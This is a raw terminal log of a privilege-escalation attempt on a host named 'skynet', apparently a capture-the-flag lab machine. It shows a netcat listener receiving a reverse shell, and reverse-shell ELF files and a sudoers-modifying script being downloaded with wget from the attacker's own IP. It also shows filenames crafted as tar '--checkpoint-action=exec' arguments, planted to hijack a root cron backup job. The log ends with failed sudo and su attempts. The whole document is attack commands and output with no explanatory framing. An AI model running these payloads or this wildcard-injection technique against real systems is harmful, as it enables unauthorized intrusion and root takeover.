
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443                                                          
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.155.35] 48128
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 09:48:03 up  3:34,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can´t access tty; job control turned off
$ ls -la
total 96
drwxr-xr-x  23 root root  4096 Sep 18  2019 .
drwxr-xr-x  23 root root  4096 Sep 18  2019 ..
drwxr-xr-x   2 root root  4096 Sep 17  2019 bin
drwxr-xr-x   3 root root  4096 Sep 17  2019 boot
drwxr-xr-x  17 root root  3640 Jun 14 06:13 dev
drwxr-xr-x 102 root root  4096 Nov 26  2020 etc
drwxr-xr-x   3 root root  4096 Sep 17  2019 home
lrwxrwxrwx   1 root root    32 Sep 17  2019 initrd.img -> boot/initrd.img-4.8.0-58-generic
lrwxrwxrwx   1 root root    33 Sep 17  2019 initrd.img.old -> boot/initrd.img-4.4.0-161-generic
drwxr-xr-x  22 root root  4096 Sep 17  2019 lib
drwxr-xr-x   2 root root  4096 Sep 17  2019 lib64
drwx------   2 root root 16384 Sep 17  2019 lost+found
drwxr-xr-x   3 root root  4096 Sep 17  2019 media
drwxr-xr-x   2 root root  4096 Feb 26  2019 mnt
drwxr-xr-x   2 root root  4096 Feb 26  2019 opt
dr-xr-xr-x 139 root root     0 Jun 14 06:13 proc
drwx------   4 root root  4096 Sep 17  2019 root
drwxr-xr-x  26 root root   920 Jun 14 06:25 run
drwxr-xr-x   2 root root 12288 Sep 17  2019 sbin
drwxr-xr-x   2 root root  4096 Sep 17  2019 snap
drwxr-xr-x   3 root root  4096 Sep 17  2019 srv
dr-xr-xr-x  13 root root     0 Jun 14 06:13 sys
drwxrwxrwt   9 root root  4096 Jun 14 09:48 tmp
drwxr-xr-x  10 root root  4096 Sep 17  2019 usr
drwxr-xr-x  14 root root  4096 Sep 17  2019 var
lrwxrwxrwx   1 root root    29 Sep 17  2019 vmlinuz -> boot/vmlinuz-4.8.0-58-generic
lrwxrwxrwx   1 root root    30 Sep 17  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-161-generic
$ cd home ls .la
$ cd home
/bin/sh: 3: cd: can´t cd to home
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@skynet:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root       root       4096 Sep 17  2019 .
drwxr-xr-x 23 root       root       4096 Sep 18  2019 ..
drwxr-xr-x  5 milesdyson milesdyson 4096 Sep 17  2019 milesdyson
www-data@skynet:/home$ cd milesdyson
cd milesdyson
www-data@skynet:/home/milesdyson$ ls -la
ls -la
total 36
drwxr-xr-x 5 milesdyson milesdyson 4096 Sep 17  2019 .
drwxr-xr-x 3 root       root       4096 Sep 17  2019 ..
lrwxrwxrwx 1 root       root          9 Sep 17  2019 .bash_history -> /dev/null
-rw-r--r-- 1 milesdyson milesdyson  220 Sep 17  2019 .bash_logout
-rw-r--r-- 1 milesdyson milesdyson 3771 Sep 17  2019 .bashrc
-rw-r--r-- 1 milesdyson milesdyson  655 Sep 17  2019 .profile
drwxr-xr-x 2 root       root       4096 Sep 17  2019 backups
drwx------ 3 milesdyson milesdyson 4096 Sep 17  2019 mail
drwxr-xr-x 3 milesdyson milesdyson 4096 Sep 17  2019 share
-rw-r--r-- 1 milesdyson milesdyson   33 Sep 17  2019 user.txt
www-data@skynet:/home/milesdyson$ cat user.txt
cat user.txt
7ce5c2109a40f958099283600a9ae807
www-data@skynet:/home/milesdyson$ ls -la *
ls -la *
-rw-r--r-- 1 milesdyson milesdyson   33 Sep 17  2019 user.txt

backups:
total 4584
drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4679680 Jun 14 09:54 backup.tgz
ls: cannot open directory 'mail': Permission denied

share:
total 45104
drwxr-xr-x 3 milesdyson milesdyson     4096 Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson     4096 Sep 17  2019 ..
-rw-r--r-- 1 root       root       19655446 Sep 17  2019 Convolutional Neural Networks-CNN.pdf
-rw-r--r-- 1 root       root        5743095 Sep 17  2019 Improving Deep Neural Networks.pdf
-rw-r--r-- 1 root       root       12927230 Sep 17  2019 Natural Language Processing-Building Sequence Models.pdf
-rw-r--r-- 1 root       root        4304586 Sep 17  2019 Neural Networks and Deep Learning.pdf
-rw-r--r-- 1 root       root        3531427 Sep 17  2019 Structuring your Machine Learning Project.pdf
drwxr-xr-x 2 root       root           4096 Sep 17  2019 notes
www-data@skynet:/home/milesdyson$ cat ./backups/backup.sh
cat ./backups/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
www-data@skynet:/home/milesdyson$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
www-data@skynet:/home/milesdyson$ cd /var/www/html
cd /var/www/html
www-data@skynet:/var/www/html$ ls -la
ls -la
total 68
drwxr-xr-x 8 www-data www-data  4096 Nov 26  2020 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
www-data@skynet:/var/www/html$ wget 10.18.21.236/shells/revsh444.elf
wget 10.18.21.236/shells/revsh444.elf
--2024-06-14 10:08:05--  http://10.18.21.236/shells/revsh444.elf
Connecting to 10.18.21.236:80... failed: Connection refused.
www-data@skynet:/var/www/html$ wget 10.18.21.236:8000/shells/revsh444.elf
wget 10.18.21.236:8000/shells/revsh444.elf
--2024-06-14 10:09:04--  http://10.18.21.236:8000/shells/revsh444.elf
Connecting to 10.18.21.236:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 194 [application/octet-stream]
Saving to: 'revsh444.elf'

revsh444.elf        100%[===================>]     194  --.-KB/s    in 0s      

2024-06-14 10:09:05 (44.2 MB/s) - 'revsh444.elf' saved [194/194]

www-data@skynet:/var/www/html$ ls -la
ls -la
total 72
drwxr-xr-x 8 www-data www-data  4096 Jun 14 10:09 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rw-rw-rw- 1 www-data www-data   194 Jun 14 10:03 revsh444.elf
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
www-data@skynet:/var/www/html$ chmod +x revsh444.elf
chmod +x revsh444.elf
www-data@skynet:/var/www/html$ ls -la
ls -la
total 72
drwxr-xr-x 8 www-data www-data  4096 Jun 14 10:09 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rwxrwxrwx 1 www-data www-data   194 Jun 14 10:03 revsh444.elf
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
www-data@skynet:/var/www/html$ wget 10.18.21.236/shells/revsh444.elf^Z
zsh: suspended  nc -lvnp 443
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.155.35] 48152
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 10:13:08 up  3:59,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can´t access tty; job control turned off
$ cd /var/www/html
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@skynet:/var/www/html$ touch ./--checkpoint=1
touch ./--checkpoint=1
www-data@skynet:/var/www/html$ touch ./--checkpoint-action=exec=revsh444.elf
touch ./--checkpoint-action=exec=revsh444.elf
www-data@skynet:/var/www/html$ wget 10.18.21.236:8000/shells/revsh444-32.elf -O ./revsh444.elf
<ml$ wget 10.18.21.236:8000/shells/revsh444-32.elf -O ./revsh444.elf         
--2024-06-14 10:34:44--  http://10.18.21.236:8000/shells/revsh444-32.elf
Connecting to 10.18.21.236:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 152 [application/octet-stream]
Saving to: './revsh444.elf'

./revsh444.elf      100%[===================>]     152  --.-KB/s    in 0s      

2024-06-14 10:34:44 (40.0 MB/s) - './revsh444.elf' saved [152/152]

www-data@skynet:/var/www/html$ ls -la
ls -la
total 72
-rw-rw-rw- 1 www-data www-data     0 Jun 14 10:14 --checkpoint-action=exec=revsh444.elf
-rw-rw-rw- 1 www-data www-data     0 Jun 14 10:14 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Jun 14 10:14 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rwxrwxrwx 1 www-data www-data   152 Jun 14 10:29 revsh444.elf
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
www-data@skynet:/var/www/html$ ./revsh444.elf
./revsh444.elf
www-data@skynet:/var/www/html$ rm --checkpoint-action=exec=revsh444.elf
rm --checkpoint-action=exec=revsh444.elf
rm: unrecognized option '--checkpoint-action=exec=revsh444.elf'
Try 'rm ./'--checkpoint-action=exec=revsh444.elf'' to remove the file '--checkpoint-action=exec=revsh444.elf'.
Try 'rm --help' for more information.
www-data@skynet:/var/www/html$ rm "--checkpoint-action=exec=revsh444.elf"
rm "--checkpoint-action=exec=revsh444.elf"
rm: unrecognized option '--checkpoint-action=exec=revsh444.elf'
Try 'rm ./'--checkpoint-action=exec=revsh444.elf'' to remove the file '--checkpoint-action=exec=revsh444.elf'.
Try 'rm --help' for more information.
www-data@skynet:/var/www/html$ touche --checkpoint-action=exec=./revsh444.elf
touche --checkpoint-action=exec=./revsh444.elf
No command 'touche' found, did you mean:
 Command 'touch' from package 'coreutils' (main)
touche: command not found
www-data@skynet:/var/www/html$ touch --checkpoint-action=exec=./revsh444.elf
touch --checkpoint-action=exec=./revsh444.elf
touch: unrecognized option '--checkpoint-action=exec=./revsh444.elf'
Try 'touch --help' for more information.
www-data@skynet:/var/www/html$ touch ./--checkpoint-action=exec=./revsh444.elf
<ml$ touch ./--checkpoint-action=exec=./revsh444.elf                         
touch: cannot touch './--checkpoint-action=exec=./revsh444.elf': No such file or directory
www-data@skynet:/var/www/html$ touch ./--checkpoint-action=exec=./revsh444.elf
<ml$ touch ./--checkpoint-action=exec=./revsh444.elf                         
touch: cannot touch './--checkpoint-action=exec=./revsh444.elf': No such file or directory
www-data@skynet:/var/www/html$ hostname
hostname
skynet
www-data@skynet:/var/www/html$ cat /etc/os-release
cat /etc/os-release
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
www-data@skynet:/var/www/html$ uname -a
uname -a
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
www-data@skynet:/var/www/html$ cat /proc/version
cat /proc/version
Linux version 4.8.0-58-generic (buildd@lgw01-21) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017
www-data@skynet:/var/www/html$ cat /etc/issue
cat /etc/issue
Ubuntu 16.04.6 LTS \n \l

www-data@skynet:/var/www/html$ cd /home
cd /home
www-data@skynet:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root       root       4096 Sep 17  2019 .
drwxr-xr-x 23 root       root       4096 Sep 18  2019 ..
drwxr-xr-x  5 milesdyson milesdyson 4096 Sep 17  2019 milesdyson
www-data@skynet:/home$ cd milesdyson
cd milesdyson
www-data@skynet:/home/milesdyson$ ls -la
ls -la
total 36
drwxr-xr-x 5 milesdyson milesdyson 4096 Sep 17  2019 .
drwxr-xr-x 3 root       root       4096 Sep 17  2019 ..
lrwxrwxrwx 1 root       root          9 Sep 17  2019 .bash_history -> /dev/null
-rw-r--r-- 1 milesdyson milesdyson  220 Sep 17  2019 .bash_logout
-rw-r--r-- 1 milesdyson milesdyson 3771 Sep 17  2019 .bashrc
-rw-r--r-- 1 milesdyson milesdyson  655 Sep 17  2019 .profile
drwxr-xr-x 2 root       root       4096 Sep 17  2019 backups
drwx------ 3 milesdyson milesdyson 4096 Sep 17  2019 mail
drwxr-xr-x 3 milesdyson milesdyson 4096 Sep 17  2019 share
-rw-r--r-- 1 milesdyson milesdyson   33 Sep 17  2019 user.txt
www-data@skynet:/home/milesdyson$ mkdir .ssh
mkdir .ssh
mkdir: cannot create directory '.ssh': Permission denied
www-data@skynet:/home/milesdyson$ touch '--myfile'
touch '--myfile'
touch: unrecognized option '--myfile'
Try 'touch --help' for more information.
www-data@skynet:/home/milesdyson$ echo "" > '--checkpoint=1'
echo "" > '--checkpoint=1'
bash: --checkpoint=1: Permission denied
www-data@skynet:/home/milesdyson$ cd /var/www/html
cd /var/www/html
www-data@skynet:/var/www/html$ ls -la
ls -la
total 72
-rw-rw-rw- 1 www-data www-data     0 Jun 14 10:14 --checkpoint-action=exec=revsh444.elf
-rw-rw-rw- 1 www-data www-data     0 Jun 14 10:14 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Jun 14 10:14 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rwxrwxrwx 1 www-data www-data   152 Jun 14 10:29 revsh444.elf
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
www-data@skynet:/var/www/html$ rm -i *
rm -i *
rm: unrecognized option '--checkpoint-action=exec=revsh444.elf'
Try 'rm ./'--checkpoint-action=exec=revsh444.elf'' to remove the file '--checkpoint-action=exec=revsh444.elf'.
Try 'rm --help' for more information.
www-data@skynet:/var/www/html$ rm -i ./*
rm -i ./*
rm: remove regular empty file './--checkpoint-action=exec=revsh444.elf'? y
y
rm: remove regular empty file './--checkpoint=1'? y
y
rm: cannot remove './45kra24zxs28v3yd': Is a directory
rm: cannot remove './admin': Is a directory
rm: cannot remove './ai': Is a directory
rm: cannot remove './config': Is a directory
rm: cannot remove './css': Is a directory
rm: remove regular file './image.png'? n
n
rm: remove regular file './index.html'? n
n
rm: cannot remove './js': Is a directory
rm: remove regular file './revsh444.elf'? n
n
rm: remove regular file './style.css'? n
n
www-data@skynet:/var/www/html$ n
n
n: command not found
www-data@skynet:/var/www/html$ n
n
n: command not found
www-data@skynet:/var/www/html$ ls -la
ls -la
total 72
drwxr-xr-x 8 www-data www-data  4096 Jun 14 11:17 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rwxrwxrwx 1 www-data www-data   152 Jun 14 10:29 revsh444.elf
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
www-data@skynet:/var/www/html$ touch ./--checkpoint=1
touch ./--checkpoint=1
www-data@skynet:/var/www/html$ ls -la
ls -la
total 72
-rw-rw-rw- 1 www-data www-data     0 Jun 14 11:19 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Jun 14 11:19 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rwxrwxrwx 1 www-data www-data   152 Jun 14 10:29 revsh444.elf
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
www-data@skynet:/var/www/html$ touch ./--checkpoint-action=exec=./revsh444.elf
<ml$ touch ./--checkpoint-action=exec=./revsh444.elf                         
touch: cannot touch './--checkpoint-action=exec=./revsh444.elf': No such file or directory
www-data@skynet:/var/www/html$ touch ./'--checkpoint-action=exec=./revsh444.elf'
<ml$ touch ./'--checkpoint-action=exec=./revsh444.elf'                       
touch: cannot touch './--checkpoint-action=exec=./revsh444.elf': No such file or directory
www-data@skynet:/var/www/html$ echo "" > ./'--checkpoint-action=exec=./revsh444.elf'
<ml$ echo "" > ./'--checkpoint-action=exec=./revsh444.elf'                   
bash: ./--checkpoint-action=exec=./revsh444.elf: No such file or directory
www-data@skynet:/var/www/html$ bash
bash
www-data@skynet:/var/www/html$ echo "" > ./'--checkpoint-action=exec=./revsh444.elf'
<ml$ echo "" > ./'--checkpoint-action=exec=./revsh444.elf'                   
bash: ./--checkpoint-action=exec=./revsh444.elf: No such file or directory
www-data@skynet:/var/www/html$ touch ./'--checkpoint-action=exec=./revsh444.elf'
<ml$ touch ./'--checkpoint-action=exec=./revsh444.elf'                       
touch: cannot touch './--checkpoint-action=exec=./revsh444.elf': No such file or directory
www-data@skynet:/var/www/html$ wget http://10.18.21.236:8000/shells/mksudo-www-data.sh -O ./sudoer.sh          
<ml$ wget http://10.18.21.236:8000/shells/mksudo-www-data.sh -O ./sudoer.sh  
--2024-06-14 11:35:07--  http://10.18.21.236:8000/shells/mksudo-www-data.sh
Connecting to 10.18.21.236:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 108 [text/x-sh]
Saving to: './sudoer.sh'

./sudoer.sh         100%[===================>]     108  --.-KB/s    in 0s      

2024-06-14 11:35:07 (30.0 MB/s) - './sudoer.sh' saved [108/108]

www-data@skynet:/var/www/html$ chmod ./sudoer.sh +x
chmod ./sudoer.sh +x
chmod: invalid mode: './sudoer.sh'
Try 'chmod --help' for more information.
www-data@skynet:/var/www/html$ chmod +x sudoer.sh
chmod +x sudoer.sh
www-data@skynet:/var/www/html$ ls -la
ls -la
total 76
-rw-rw-rw- 1 www-data www-data     0 Jun 14 11:19 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Jun 14 11:35 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rwxrwxrwx 1 www-data www-data   152 Jun 14 10:29 revsh444.elf
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
-rwxrwxrwx 1 www-data www-data   108 Jun 14 11:33 sudoer.sh
www-data@skynet:/var/www/html$ echo "" > '--checkpoint-action=exec=sh sudoer.sh'
<ml$ echo "" > '--checkpoint-action=exec=sh sudoer.sh'                       
www-data@skynet:/var/www/html$ ls -la
ls -la
total 80
-rw-rw-rw- 1 www-data www-data     1 Jun 14 11:37 --checkpoint-action=exec=sh sudoer.sh
-rw-rw-rw- 1 www-data www-data     0 Jun 14 11:19 --checkpoint=1
drwxr-xr-x 8 www-data www-data  4096 Jun 14 11:37 .
drwxr-xr-x 3 root     root      4096 Sep 17  2019 ..
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 45kra24zxs28v3yd
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 admin
drwxr-xr-x 3 www-data www-data  4096 Sep 17  2019 ai
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 config
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 css
-rw-r--r-- 1 www-data www-data 25015 Sep 17  2019 image.png
-rw-r--r-- 1 www-data www-data   523 Sep 17  2019 index.html
drwxr-xr-x 2 www-data www-data  4096 Sep 17  2019 js
-rwxrwxrwx 1 www-data www-data   152 Jun 14 10:29 revsh444.elf
-rw-r--r-- 1 www-data www-data  2667 Sep 17  2019 style.css
-rwxrwxrwx 1 www-data www-data   108 Jun 14 11:33 sudoer.sh
www-data@skynet:/var/www/html$ sudo sudoer.sh
sudo sudoer.sh
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: password123

sudo: 3 incorrect password attempts
www-data@skynet:/var/www/html$ su root
su root
Password: password123

su: Authentication failure
www-data@skynet:/var/www/html$   
```